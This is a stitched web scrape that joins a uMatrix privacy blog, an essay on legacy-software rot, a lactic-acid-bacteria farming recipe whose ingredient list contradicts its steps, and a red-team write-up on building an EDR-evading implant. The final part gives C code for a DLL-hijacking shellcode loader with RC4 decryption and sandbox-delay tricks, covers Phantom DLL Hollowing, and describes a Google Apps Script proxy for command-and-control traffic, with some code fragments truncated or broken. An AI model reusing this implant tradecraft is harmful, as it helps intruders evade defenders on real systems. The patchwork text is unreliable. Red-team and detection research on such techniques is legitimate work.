<p>For example, CNN’s site loads resources from a staggering <strong>61 domains</strong>. That’s 61 places that can track you. <strong>30&nbsp;of those are known to track you</strong> and include Facebook, Google, a variety of specialized trackers, ad agencies, etc. It tries to <strong>run over 40 scripts</strong> and tries to place <strong>8 cookies</strong>. And this is&nbsp;<em>only</em>&nbsp;from allowing scripts! I did not allow cross-site background requests or any of the blocked domains. I’m sure if I unblocked those, there would be much, much more.</p>
<p><img loading="lazy" alt="" height="799" src="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1.png" width="510" srcset="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1.png 510w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1-191x300.png 191w" sizes="(max-width: 510px) 100vw, 510px"></p>
<p>To top it all off, advertisers have decided to go to the root of the problem, and have simply bought most ad blockers. These were then modified&nbsp;to let through certain&nbsp;“approved” ads.&nbsp;The sales pitch they give us is that they’ll only allow nonintrusive ads. Kinda like a fifty-times convicted felon telling the parole board that he’ll truly be good this time. In some cases they’ve even built tracking software directly in the ad blockers themselves. In other cases they’re basically extorting money from websites in exchange for&nbsp;letting their ads through.</p>
<h2>Bringing out the big guns</h2>
<p>So… our ad blockers are being taken over by the enemy. Our browsers are highly insecure by default. Every site can send and retrieve data from&nbsp;any place on the web. Browsers can use our cameras, microphones and GPUs. The most recent addition is the ability to show notifications on our desktops. A feature that, surprise surprise, was quickly picked up by sites to shove more of their crap in our faces.&nbsp;&nbsp;Things&nbsp;are only going to get worse as browsers get more and&nbsp;more access to&nbsp;our PCs. The media has shown that they don’t give a rats ass about your privacy or rights as long as there’s a few cents to make. The world’s most-used browser is built by a company that lives off advertising. Have we lost the war? Do we just resign ourselves to the fact that we’ll be tracked, spied upon, lied to, taken advantage of and spoon-fed advertisements like obedient little consumers every time we open a webpage?</p>
<p><strong>No.</strong></p>

<p><img loading="lazy" height="615" src="https://www.electricmonk.nl/docs/umatrix_tutorial/ani_sections.gif" width="528"></p>
<p>Umatrix is like a firewall for your browser. It stops web pages from doing&nbsp;<em>anything</em>. They can’t set cookies, they can’t load CSS or images. They can’t run scripts, use iframes or&nbsp;send data to themselves or to other sites. Umatrix blocks&nbsp;<em>everything</em>. Umatrix is what browsers should be doing by default. Ad blockers are just not enough. They only block ads and then only the ones they know about. To get any decent kind of protection of your privacy, you always needed at least an Adblocker, a privacy blocker such as Privacy Badger and a script blocker such as Noscript. Umatrix replaces&nbsp;<em>all</em>&nbsp;of those, and does a better job at it too.</p>
<p>Umatrix gives you full insight into what a website is trying to do. It gives you complete control over what a website is and isn’t allowed&nbsp;to do. It has a bit of a learning curve, which is why I <a href="https://www.electricmonk.nl/docs/umatrix_tutorial/umatrix_tutorial.html">wrote a tutorial for it</a>.</p>
<p>When you just start out using umatrix, you’ll find that many sites don’t work properly. On the other hand, many sites work a lot better.&nbsp;If you take a little time to unblock things so that your favorite sites work again (and save those changes), you’ll notice within a few hours that it’s not so bad. Umatrix is still for technical users and even those might find it too much of a chore. I find it worth the small effort to unblock things if that means my privacy stays intact. And more importantly, I’m never annoyed anymore by ads or&nbsp;pop-ups, plus I’m much less likely to accidentally run some malicious javascript.</p>
<p>This is what a CNN article looks like with Umatrix enabled and only allows first-party (<code>*.cnn.com</code>) CSS and images, which I have set as the default:</p>
<p><img loading="lazy" alt="" height="967" src="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean.png" width="820" srcset="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean.png 820w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean-254x300.png 254w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/cnn_clean-768x906.png 768w" sizes="(max-width: 820px) 100vw, 820px"></p>
<p>Look at that beauty. It’s clean.&nbsp;It loads super fast.&nbsp;It cannnot track me.&nbsp;It’s free of ads, pop-ups, auto playing videos, scripts and cookies. Remember, this didn’t take any manual unblocking. This is just what it looks like out of the box with umatrix.</p>
<p>Umatrix makes the web usable again.</p>
<h2>Get it, install it, love it</h2>
<p>Get it for&nbsp;<a href="https://addons.mozilla.org/firefox/addon/umatrix/">Firefox</a>,&nbsp;<a href="https://chrome.google.com/webstore/detail/%C2%B5matrix/ogfcmafjalglgifnmanfmnieipoejdcf">Chrome</a>&nbsp;or&nbsp;<a href="https://addons.opera.com/en-gb/extensions/details/umatrix/">Opera</a>. Umatrix is <a href="https://github.com/gorhill/uMatrix">Open Source</a>, so it cannot be bought out by ad agencies.</p>
<p>Read <a href="https://www.electricmonk.nl/docs/umatrix_tutorial/umatrix_tutorial.html">my tutorial to get started with umatrix</a>, as the learning curve is fairly steep.</p>
<p>Thanks for reading and safe browsing!</p>


<p><sup><a id="note_1" name="note_1">*)</a> Someone will probably bring up the whole “but content creators should / need / deserve money too!” argument again. I’m not interested in discussions about that. They’ve had the chance to behave, and they’ve misbehaved time and time again. At some point, you don’t trust the pathological liars anymore. No content creator switched to a more decent ad provider that doesn’t fuck its customers over. The blame is on them, not on the people blocking their tracking, spying, attention-grabbing shit.

<p>I recently <a href="https://twitter.com/jxxf/status/1219009308438024200" target="_blank" rel="noreferrer noopener">came across a story</a> that is just as amusing as it is shocking:</p>



<blockquote><p><em>One of my clients is responsible for several of the world’s top 100 pension funds. They had a nightly batch job that … crashed. No one knew what was wrong at first. This batch job had never, ever crashed before, as far as anyone remembered or had logs for.&nbsp;</em></p><p><em>The person who originally wrote it had been dead for at least 15 years, and in any case hadn’t been employed by the firm for decades. The program was not that big… but it was fairly impenetrable — written in a style that favored computational efficiency over human readability. And of course, there were zero tests.&nbsp;</em></p><p><em>As luck would have it, a change in the orchestration of the scripts that ran in this environment had been pushed the day before. This was believed to be the culprit. Engineering rolled things back to the previous release. Unfortunately, this made the problem worse.</em></p><p><em>…</em></p><p>Another program, the benefits distributor, was supposed to alert people when contributions weren’t enough for projections… <em>Noticing that there was no output from the first program since it had crashed, it treated this case as “all contributions are 0”. This, of course, was not what it should do. But no one knew it behaved this way since, again, the first program had never crashed.</em></p><p><em>…</em></p><p><em>I got an unexpected text from the CIO. “sorry to bother you, we have a huge problem. s1X. Can you fly in this afternoon?” S1X is their word for “worse than severity 1 because it’s cascading other unrelated parts of the business”.</em></p></blockquote>



<p>Fortunately all of our pensions are safe and the above story has a happy ending. But it is hardly reassuring that our mission-critical financial systems are relying on antiquated software that literally no one alive understands.</p>



<p><em>Yet another story with a less happy ending – <a rel="noreferrer noopener" href="https://www.bbc.com/news/technology-54423988" target="_blank">16,000 coronavirus cases went unreported in England because of an agency’s use of an obsolete 30 year old file format</a>.</em></p>



<h2>Businesses for Bit Rot</h2>



<p>It turns out the above is no isolated example. Back in 2012 when I left Intel to join Sun, I realized just how badly their SPARC product line was doing. Once the golden goose of the dot-com server era, it had since fallen incredibly far behind Intel’s Xeon product line. I was literally told by my own manager, to run our simulations on the Intel Xeon servers and not the SPARC server farm, because <em>“it is very slow.”</em> Even worse, not only did Intel’s CPUs perform better, their manufacturing edge meant that they were significantly cheaper to make as well.</p>



<p>The next obvious question that I had: Why on earth are people even buying our SPARC chips, if they are so far behind the competition? The answer I got from a senior architect boggled my mind. Our customers had software systems so ossified, that they could only ever be run on SPARC/solaris systems. Migrating to x86/Linux would be too herculean a task for them to take on. In many cases, they had even <em>lost</em> their source code, preventing them from even recompiling their applications. The best they could ever do was to upgrade to the latest generation of the same SPARC processors, regardless of how slow or expensive they were.</p>



<p>That’s right, our entire division’s business model revolved around corporate America’s rotting software systems.</p>



<h2>The Cost of Keeping The Lights On</h2>



<p>When I first joined Amazon, I found myself working on the perfect archetype of a legacy system. It was initially developed with tons of tech debt… by another team… which had long since disbanded. Ownership of the project had then been transferred over to our team… and it proved to be so unpopular, that developers started transferring out to other teams in droves. Of the ~10 team members when I joined, not a single one still remained a year later.</p>



<p>On the surface, the system had many things going for it. It was written in a modern language and tech stack (Java 8). It had an entire team of six-figure-income developers supporting it daily. And it was constantly being updated to fix bugs and/or add new features.</p>



<p>And yet, despite all this, it was easy to see how the turnover was weighing down the system like an albatross. As a result of the ownership change and team turnover, a tremendous amount of institutional knowledge was lost. Knowledge such as overall code design, end-to-end functionality, best practices and debugging techniques. We were working hard to keep things chugging along. And yet, it felt like we were bogged down in a swamp, constantly second-guessing every change, surrounded on all sides by a fog of war.</p>



<p>Can you imagine how much worse things would have been if the project was running on Java 1, with zero active development, and no developers assigned to own it?</p>



<h2>Preventing Catastrophic Failure</h2>



<p>As software developers, we strive to produce robust bug-free systems that can simply be left to run on their own, for years and years, without any manual intervention. By that metric, the pension fund’s script is surely a smashing success.&nbsp;</p>



<p>And yet, the harsh reality is that everything will break… one day. Everything will eventually need to be updated.&nbsp;</p>



<ul><li>Maybe your system relies on hardware that is no longer being produced</li><li>Or your system has dependencies that are now defunct</li><li>Or dependencies with major security vulnerabilities and the only patches are on backwards incompatible versions</li><li>Or the application was developed based on <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Year_2000_problem" target="_blank">certain assumptions that are no longer true</a></li><li>Or the world has simply changed, and the application needs to change with it</li></ul>



<p>No matter what the reason is, <em>change is inevitable</em>. The only question is how painful it will be, when it finally arrives. </p>



<p>If you have a system that is being actively worked on, change need not be all that painful. But if you have a system that has been completely ignored for multiple years or even decades, there are so many things that can go catastrophically wrong.</p>



<ul><li>The people who built the system may no longer be at the company</li><li>The source code may get lost</li><li>People may not know how to properly compile the source code, to produce the executable</li><li>Or deploy the new executable</li><li>Or correctly run the executable, with all flags correctly configured</li><li>Or make sense of the code architecture and implementation</li><li>Or the invariants and implicit assumptions that the code relies on, in order to function correctly</li><li>Or run the automated tests</li><li>Or debug test failures</li><li>Or debug production failures</li><li>Or access production logs and metrics</li></ul>



<p>Trying to exhaustively document all of the above, will help. But your documentation will always be sub-optimal. It will always contain gaping holes. Comprehensive documentation is no substitute for getting your hands dirty.</p>



<h2>An Idle Mind</h2>



<p>Having a dedicated developer who is responsible for owning and maintaining all of the above, is definitely a good first step. But it is not sufficient.</p>



<p>People will only “read the docs” so many times, before getting bored. They will not get the same learnings that come only from experience. And solving real problems.</p>



<p>If asked to “audit” things, there’s a very good chance that they will simply rubber-stamp it and sweep it under the rug, while focusing on other newer and shinier projects… or simply goofing off. Without any real deliverables or challenges, many will simply follow the path of least resistance.</p>



<p>If you truly want to avoid software rot, the only way is to ensure that you’re continuously moving. Even if it seems unnecessary or risky. Simply because the best way to build and maintain and verify your institutional knowledge and capabilities, is through continually making changes, and testing your ability to successfully execute on these changes. The day you stop moving, is the day your institutional knowledge starts decaying and falling apart.</p>



<p>Even moving in circles, as ridiculous as it sounds, would be an improvement over neglect. But more realistically, there is always something the maintainers can do to move the needle forward, even if it is in tiny amounts.</p>



<p>You could update your environment to use the latest versions of all dependencies:</p>



<ul><li>Such as migrating from JDK 8 to 11</li><li>Or updating your JVM to use the G1 garbage collector instead of CMS</li><li>Or updating your GCC compiler from version 5 to 7</li><li>Or upgrading your Database from Postgres 9.5 to Postgres 11</li><li>Or updating your AWS SDK from version 1.10 to 1.11</li><li>Or installing the latest linux distro on your production fleet</li></ul>



<p>In severe cases where your dependencies are hopelessly obsolete, you can investigate migrating to a newer stack entirely:</p>



<ul><li>Such as migrating from SPARC to x86.</li><li>Or Solaris to Linux.</li></ul>



<p>You can keep your developers sharp by updating your application as well:</p>



<ul><li>Such as fixing any lingering bugs and edge cases</li><li>Or strengthening your automated test suite</li><li>Or cleaning up tech debt</li><li>Or making performance optimizations</li><li>Or implementing new features</li><li>Or simply refactoring your code incrementally to make it more readable</li></ul>



<p>The above changes are bound to introduce transient risks and incur seemingly <em>“unnecessary”</em> expenses. Inevitably, your developers will make mistakes and introduce bugs. When faced with such costs, it is very tempting to simply step back and do nothing at all. <em>“If it ain’t broke, don’t fix it.”</em></p>



<p>If the system in question provides minimal business value, that may even be the rational thing to do. But for any mission-critical system, neglect will only tradeoff smaller transient risk, for permanent catastrophic risk. The risk that one day, your system will need to be urgently debugged or updated, but your organization will find itself utterly incapable of doing so.</p>



<p>For any mission-critical system, it is vital to preserve institutional knowledge and capability. And the only way to do that is through continual exercise. Your (company’s) brain is a muscle. Use it or lose it.</p>

<blockquote><p><em>That’s right, dearest reader; it’s time for the latest installment of how to make your own organic growing inputs, courtesy of Korean Natural Farming practices. Ditch the bottles, make your own inputs and feel like a complete boss while you’re doing it.</em></p></blockquote>



<p>It’s the little things in life that count: something I constantly re-iterate to my loving wife. Like some sort of defensive mantra that is definitely in no way linked to the size of my manhood, the quality of any one particular thing in life is always of much more importance than its quantity. The Flight of the Conchords say, “two minutes in heaven is better than no minutes in heaven”. Sure, bigger things may initially seem more gratifying to our inherently greedy human brains, but I’d much rather a small amount of something perfect, than a huge load of something satisfactory. </p>



<p>What I’m trying to convey is just how important small things are, especially when talking about bacteria. In a similar fashion to their fungal friends, they play a wide variety of roles in plant growth and are particularly crucial when growing in an organic setting. Soil life thrives with healthy and diverse biology, so it is crucial that you almost pay more attention to promoting the health of your soil biology than you do the actual plants growing in it. One particular type of beneficial bacteria that you can easily culture from the natural world is Lactic Acid Bacteria (LAB), which will be the focus of our attention for the next few pages.</p>



<h2><strong>What exactly are LAB’s?</strong></h2>



<p>Lactic Acid Bacteria (LAB) are a particularly interesting group of bacteria that are one of the key components of a full-blown KNF regime. Why are they particularly interesting, I hear you ask? Well, they are one of the few groups of bacteria that are capable of functioning in both aerobic and anaerobic conditions. “Anaerobic bacteria?” I hear you cry, “What the crikey-fuck do you want them for? That’s root disease territory isn’t it?” Well, yes, the majority of root diseases are anaerobic pathogens, but these bacteria are cut from an entirely different cloth, my friend.</p>



<p>This particular group of bacteria (as the name would suggest) produce lactic acid as a by-product of their digestive process. LAB are extremely widespread in nature, found pretty much everywhere in the environment, hence why capturing and culturing them is actually quite an easy and fun process. This is also one of the first steps in making your own cheese. </p>



<p><strong>What do they even bloody do?</strong></p>



<div><figure><img loading="lazy" src="https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB.jpg" alt="LAB DIY" width="350" height="427" srcset="https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB.jpg 350w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB-250x305.jpg 250w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/whey-LAB-120x146.jpg 120w" sizes="(max-width: 350px) 100vw, 350px"></figure></div>



<p>There are a few ways in which making use of LAB can benefit your grow. You don’t even have to go the whole hog on the organic regime front either; you can integrate it quite easily into pretty much any style of growing. One of the first things they do is simply populate space in your media. This might sound a bit boring and of no significance, but by populating free space in your media, they will be preventing harmful pathogens from ever making their way in. Similar to how bouncers at a club turn away groups of drunken men without any women with them, but probably with a higher IQ.</p>



<p>But wait – there’s more! Not only do they help to out-populate bad bacteria, they also help to break down organic nutrients locked away in those pesky organic carbon complexes within your media. The decomposition of organic matter/amendments is greatly increased within the media when you apply a LAB serum, meaning a much greater availability of nutrients for absorption by the plants. For this reason, they are a fantastic addition when you are making your own compost or compost teas, as they will help to greatly increase the availability of all of that lovely organic nutrient. It’s kind of like little knives and forks going around and cutting up all the food on the plate ready for the plant to eat.</p>



<p>One thing to potentially look out for when you are using LAB culture, particularly with fruiting plants, is that you slow down with the application rate towards the end of the flowering cycle. This is just to ensure that you are not over-applying LAB’s, as in certain circumstances, over application can actually cause a response in the plant that will lower the Brix levels in your fruits. This obviously results in a slight loss of sweetness in the overall flavor of your fruit, something to be avoided if at all possible. </p>



<h2><strong>How exactly do you make it?</strong></h2>



<p><strong>You will need:</strong></p>



<div>




<div>
<ul><li>Milk</li><li>Strainer</li><li>Sugar (optional)</li></ul>
</div>
</div>



<div><p>Essentially, what you are doing here is making curds and whey. Miss Muffet would probably love to get her hands on such freshly-prepared dairy produce.</p> <ol><li><strong></strong> <p>Wash your rice in some water. Just like you would if you were normally making rice, but rather than discarding the water, pour it into a container to about two thirds full.</p> </li><li><strong></strong> <p>Cover the container with a breathable lid. Store in a cool, dry, and dark place, moving it as little as possible.</p> </li><li><strong></strong> <p>Wait three to five days. You will know when it is done as the smell of the liquid will become slightly sweet. This means that the LAB has cultured correctly in the solution. If you see any weird-looking bacteria growing on the surface during this time, discard and start again.</p> </li><li><strong></strong> <p>Try to collect the middle layer of the solution. There will be a slightly thicker layer at the top of the liquid, which ideally you do not want to collect. Focus on the layer directly underneath this.</p> </li><li><strong></strong> <p>Add 1-part cultured rice wash to 10 parts of your milk. Ideally, do not do this with milk that is either pasteurized (because of the antibiotics) or straight out of the fridge (slows the process down slightly). Once again, store in a cool, dry, and dark place.</p> </li><li><strong></strong> <p>After three to five days (longer when temperatures are cooler), you will see that the solution has totally separated into curds and whey. The curds will be at the top and the yellow whey serum at the bottom. The yellow liquid is the LAB culture.</p> </li><li><strong></strong> <p>Separate the solids from the liquids. This involves a quick straining through an appropriate implement. There will be a little layer of solids at the bottom as well; try to avoid collecting these in your final solution.</p> </li><li><strong></strong> <p>Put LAB liquid into a container and store in a fridge for use. Use at 1 mL per liter once a week until the mid-flower period. If you want to make it for long-term storage, add equal weight brown sugar to the liquid.</p> </li></ol></div>



<div><figure><img loading="lazy" width="324" height="243" src="https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB.jpg" alt="Lactic acid bacteria DIY" srcset="https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB.jpg 324w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB-250x188.jpg 250w, https://gardenculturemagazine.com/wp-content/uploads/2019/05/LAB-120x90.jpg 120w" sizes="(max-width: 324px) 100vw, 324px"></figure></div>



<h2><strong>Jobs a good’un</strong></h2>



<p>So, that is basically it. You now are the proud owner of some LAB serum that is perfect for immediate use as a root drench, or just as good to use in a compost tea brew. It also makes a great addition to a compost pile, helping to process the waste into a rich material much faster than it would usually take.</p>



<p>Like most KNF inputs, you can use this as a one-off additive, even if you aren’t growing in a typical organic environment. For example, if you are a coco/hydroponic grower, you can inoculate your media at 1 mL per liter to get all the benefits of Lactic Acid Bacteria, without changing anything else about your particular methods. </p>



<p>Anyway, just remember the next time you are making some rice, that wastewater from the rinse could be put to much better use than simply pouring down your sink.<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1719"><div><div><div id="primary"><main id="main" role="main"><div><div><p>It is both common and important for the development of a <a href="https://www.blackarrow.net/red-team/">Red Team</a> exercise to obtain information about the technologies and restrictions of the environment where our TTPs are going to be executed. This information mainly implies substantial changes in our <em>modus operandi</em>. Generally, one of these changes is to put aside known/public offensive tools and develop our own custom implants ad-hoc for the customer’s ecosystem, at the initial stages of infection where the chances of detection are high.</p><p>The following case that we would like to share is a clear example of this type of exercise. In one of our clients, we did obtain information about the EDR (Endpoint Detection &amp; Response) technology deployed and the network restrictions for outgoing connections, where only domains such as Google, Microsoft, etc. are allowed.</p><p>After studying different approaches to bypass these restrictions, we proceed to develop a custom implant with the necessary capabilities to reach the BlackArrow C&amp;C and carry out various post-exploitation actions without being detected. The following diagram represents the steps performed by the implant:</p><div><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-1024x643.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-1024x643.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-362x227.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1-768x482.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/implant-1.png 1324w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Implant logic</figcaption></figure></div><h2>Step 1: DLL Order Hijacking</h2><p>It is known that the use of <strong>DLL Order Hijacking</strong> is still quite efficient not only with AVs but also against EDR technologies. It is no wonder that multiple actors have been using these evasion techniques <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.plugx">for years</a>. As an input vector for the exercise, we chose one of the binaries used in a recent campaign described by Dr. Web in his report “<a href="https://st.drweb.com/static/new-www/news/2020/october/Study_of_the_ShadowPad_APT_backdoor_and_its_relation_to_PlugX_en.pdf">Study of the ShadowPad APT backdoor and its relation to PlugX</a>” . Specifically, we used the legitimate binary <strong>TosBtKbd.exe</strong> signed by TOSHIBA CORPORATION that, as shown below, is susceptible to DLL order hijacking in its function 0x4024A0.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking.png 999w, https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking-362x124.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/DLL-Order-Hijacking-768x264.png 768w" sizes="(max-width: 999px) 100vw, 999px"></a><figcaption>DLL Order Hijacking (TosBtKbd.exe)</figcaption></figure><p>As we can see in the image, the DLL “TosBtKbd.dll” is loaded, via <code>LoadLibrary()</code>, without specifying its full path, making it possible to load a harmful DLL. Notice that the <code>SetTosBtKbdHook</code> symbol is invoked immediately.</p><h2>Step 2: RC4 Decryption (reflective PE)</h2><p>Running TosBtKbd.exe will trigger the harmful actions through our DLL. The skeleton of <a href="https://github.com/blackarrowsec/redteam-research/tree/master/EDR_AV%20Bypass/Google%20Script%20Proxy">this library</a> is shown below.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="181" data-enlighter-title="" data-enlighter-group="">//#include "syscalls.h" //SysWhispers

void __stdcall SetTosBtKbdHook(void)
{
	char key[11];
	stale();

	//Get RC4 Key (TimeDateStamp DWORD value)
	DWORD ts = getKey();
	if (ts == NULL) return;

	sprintf_s(key, "%X", ts);
	DWORD dwCount;

	//Get encrypted shellcode from resource
	PCHAR exec = getResource(&amp;dwCount);
	if (exec != NULL)
	{
		//Decrypt shellcode
		decrypt(key, exec, &amp;dwCount);

		//Lazy check (reflective loading stub)
		if ((exec[1] == 'Z') &amp;&amp; (exec[2] == 'E'))

				//Less obvious indirect call
				__asm
				{
					mov eax, pMappedCode
					push eax;
					ret
				}
			}
		}
	}
}</pre><p>First of all, the <code>stale()</code> function is run. Its goal is to distract and confuse some machine learning checks and sandboxes that execute the DLL looking for malicious activity. By playing with the variable <code>limit</code>, we can get a delay of seconds/minutes before executing the malicious actions.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="102" data-enlighter-title="" data-enlighter-group="">double c(int num1) { return (16 / (num1 * pow(5.0, num1 * 1.0))); }
double c1(int num1) { return (4 / (num1 * pow(249.0, num1 * 1.0))); }

void stale()
{
	// Stale code. Play with the "limit" var to look for a delay you feel happy with 
	double limit = 100;
	int j = 0;
	double ans1 = 0.0;
	double ans2 = 0.0;
	int flag = 1;

	for (j = 1; j &lt;= limit; j += 1) {
		if (flag == 1) {
			ans1 += c(j);
			ans2 += c1(j);
			flag = 0;
		}
		else {
			ans1 -= c(j);
			ans2 -= c1(j);
			flag = 1;
		}
	}
	printf("%f", ans1);
}</pre><p>Afterwards, an embedded resource in the DLL will be loaded and decrypted using the Windows CryptoAPI. This resource is a binary encrypted with RC4 that implements the main logic of the implant, that is, to establish communication with our C&amp;C and execute post-exploitation actions.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1024x363.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1024x363.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-362x128.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-768x272.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption-1536x545.png 1536w, https://www.blackarrow.net/wp-content/uploads/2020/11/Resource-decryption.png 1770w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Resource decryption (reflective PE)</figcaption></figure><p>It has been observed that some EDRs exclusively upload the unknown binaries to their cloud-sandbox for analysis, which is why TosBtKbd.exe’s TimeDataStamp has been used as RC4 key. Using a key from a file header of the container process, will make necessary an analysis within the appropriate context to recover the decrypted binary, which translates into more time for a hunter or malware analyst to obtain artifacts of interest such as, for example, the IP or domain of our C&amp;C.</p><p> The following image shows the creation of the reflective PE from the binary compiled from Visual Studio using <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a> (developed by security researcher Hasherezade). Note that later the binary is encrypted with RC4 using the TosBtKbd.exe’s TimeDataStamp.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation-1024x128.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation-1024x128.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation-362x45.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation-768x96.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/Reflective-PE-generation.png 1219w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Reflective PE generation (RC4 encryption)</figcaption></figure><h2>Step 3: Phantom DLL</h2><p>In order to make memory hunting more difficult and as an alternative to the most common <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">injection techniques</a>, <strong><a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">Phantom DLL Hollowing</a></strong> has been used. Using this approach, created by the researcher Forrest Orr, it is possible to execute the binary within a + RX section, making it very difficult to detect it using traditional tools based on RWX allocations or <a href="https://gist.githubusercontent.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2/raw/104f630cc1dda91d4cb81cf32ef0d67ccd3e0735/Get-InjectedThread.ps1">suspicious threads</a>.</p><p>In our case, the DLL used to make the phantom is&nbsp;<strong>aadauthhelper.dll</strong>, which was&nbsp;chosen based on the size of its .text section to house our reflective PE. You can notice the loader stub right at the beginning of that section (0x556C1000).</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section.png 1006w, https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section-362x149.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/RX-section-768x317.png 768w" sizes="(max-width: 1006px) 100vw, 1006px"></a><figcaption>RX section (aadauthhelper.dll)</figcaption></figure><p>To start our implant’s execution, once the Hollowing DLL has been done, the classical cast of a function pointer (<code>call eax</code>) has been replaced with a less obvious indirect call: <code>push eax, ret</code>.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="209" data-enlighter-title="" data-enlighter-group="">//Phantom DLL hollowing

Regarding various alternatives, such as Domain-Fronting and <a href="https://github.com/SixGenInc/Noctilucent">similar techniques</a>, we opted for something more “innovative”. In this context, we took an idea from a Forcepoint <a href="https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control">analysis</a> on certain Carbanak TTPs where said actor abused the <strong><a href="https://developers.google.com/apps-script">Google Apps Script</a></strong> to send and receive commands. Instead of using said platform as a command and control server, its scripting capabilities would be used to configure a proxy that allows us to reach our C&amp;C.</p><p>It should be noted that there are various <a href="https://github.com/a-rey/google_RAT">offensive tools</a> that already take advantage of this platform in a very similar way to the initial idea raised by the <a href="https://www.blackarrow.net/red-team/">Red Team</a>/<a href="https://www.blackarrow.net/managed-detection-and-response-mdr/">Threat Hunting</a> team at BlackArrow. However, given the small number of real incidents that make use of these TTPs, it was considered that it could be the most appropriate approach to test the filtering capabilities of our target.</p><p>The result has been the development of a binary in C that makes use of the approach described in the following graphic.</p><figure><a href="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript.png"><img src="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-1024x756.png" alt="" srcset="https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-1024x756.png 1024w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-362x267.png 362w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript-768x567.png 768w, https://www.blackarrow.net/wp-content/uploads/2020/11/GoogleScript.png 1336w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Connections through proxy (Google Apps Script)</figcaption></figure><p>At first, our implant will launch a GET request (via HTTPS) in which it will embed, in one of its parameters, the URL of the C&amp;C. This URL will be extracted from Google Apps Script and will act as an intermediary between the client’s communications and the control server.</p><p>After receiving the first GET, our C&amp;C will return a random 10-byte token to the client. This token ensures that the connection comes from a legitimate host. Periodically, the implant, via POST, will check for new jobs. The result of these jobs (<em>ps</em>, <em>screenshot</em>, <em>getinfo</em>, etc.) will be sent to our C&amp;C encoded in base64.</p><p>The code snippet belows shows the main loop in charge of managing the collection and sending of the results associated with each job. The <code>runJob()</code> function will be responsible for executing, through a <em>switch case</em>, each of the control commands and returning the result encoded in base64.</p><pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">void C2_jobs(HINTERNET hConnect, TCHAR* urlPost)

